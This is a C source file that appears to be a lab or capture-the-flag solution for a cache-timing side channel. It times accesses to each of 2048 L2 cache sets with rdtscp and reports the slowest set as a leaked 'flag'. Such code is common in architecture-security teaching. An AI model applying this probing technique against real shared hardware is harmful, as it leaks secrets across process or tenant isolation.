#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define BUFF_SIZE (2 * 1024 * 1024)  // 2MB Hugepage
#define CACHE_LINE_SIZE 64
#define NUM_L2_CACHE_SETS 2048
#define PROBES 10

// <--- ADD THIS FUNCTION
static inline uint64_t rdtscp() {
    uint32_t lo, hi;
    __asm__ volatile (
        "rdtscp"
        : "=a" (lo), "=d" (hi)
        :
        : "%rcx"
    );
    return ((uint64_t)hi << 32) | lo;
}

int main(int argc, char const *argv[]) {
    int flag = -1;

    // Step 1: Allocate hugepage memory
    uint8_t *buf = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    if (buf == MAP_FAILED) {
        perror("mmap failed");
        exit(1);
    }
    memset(buf, 0, BUFF_SIZE);

    // Step 2: Measure access times for each cache set
    uint64_t times[NUM_L2_CACHE_SETS] = {0};

    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        uint64_t total_time = 0;
        for (int i = 0; i < PROBES; i++) {
            uint64_t start = rdtscp();  // <--- changed
            // Access 8 different cache lines for the set
            for (int way = 0; way < 8; way++) {
                volatile uint8_t *addr = buf + (set * CACHE_LINE_SIZE) + (way * 4096);
                *addr;
            }
            uint64_t end = rdtscp();    // <--- changed
            total_time += (end - start);
        }
        times[set] = total_time / PROBES;
    }

    // Step 3: Find the set with maximum latency
    int guessed_flag = 0;
    uint64_t max_time = 0;
    for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
        if (times[set] > max_time) {
            max_time = times[set];
            guessed_flag = set;
        }
    }

    flag = guessed_flag;

    printf("Flag: %d\n", flag);
    return 0;
}
